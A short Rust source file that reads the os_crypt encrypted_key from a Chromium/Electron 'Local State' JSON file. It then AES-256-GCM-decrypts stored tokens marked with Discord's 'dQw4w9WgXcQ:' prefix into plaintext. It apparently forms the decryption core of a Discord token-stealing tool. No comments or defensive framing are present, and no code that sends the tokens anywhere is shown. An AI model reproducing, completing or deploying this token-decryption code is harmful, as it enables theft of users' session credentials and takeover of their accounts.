use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
use base64::Engine;
use serde::Deserialize;
use std::path::PathBuf;

#[derive(Debug, Deserialize)]
struct Crypt {
    encrypted_key: String,
}

#[derive(Debug, Deserialize)]
struct Config {
    os_crypt: Crypt,
}

pub fn get_key(path: PathBuf) -> String {
    let contents = std::fs::read_to_string(path).unwrap();

    let config: Config = serde_json::from_str(&contents).unwrap();
    config.os_crypt.encrypted_key
}

pub fn decrypt_token(aes_key: &[u8], token_str: &[u8]) -> String {
    let full_str = std::str::from_utf8(token_str).expect("Invalid UTF-8");

    let b64_part = full_str
        .split("dQw4w9WgXcQ:")
        .last()
        .expect("Malformed token string");

    let raw_encrypted = base64::engine::general_purpose::STANDARD
        .decode(b64_part)
        .expect("Failed to Base64 decode token");

    let payload = &raw_encrypted[3..];

    let (nonce_bytes, ciphertext) = payload.split_at(12);

    let key = Key::<Aes256Gcm>::from_slice(aes_key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);

    let decrypted_bytes = cipher
        .decrypt(nonce, ciphertext)
        .expect("Failed to decrypt AES (Tag mismatch or wrong key)");

    String::from_utf8(decrypted_bytes).expect("Decrypted data is not valid UTF-8")
}
